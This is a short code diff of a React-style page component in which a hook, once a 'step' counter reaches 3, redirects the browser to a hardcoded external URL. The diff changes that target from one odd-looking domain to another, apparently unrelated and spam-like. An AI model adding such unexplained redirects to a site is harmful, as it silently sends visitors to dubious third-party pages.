@@ -19,7 +19,7 @@ export default function Home() {
 
   useEffect(() => {
     if (step === 3) {
-      window.location.href = 'https://alexandra1507.pro/1x1/a%20(9).html';
+      window.location.href = 'https://star168.7lha.com/archives/61761';
     }
   }, [step]);
 
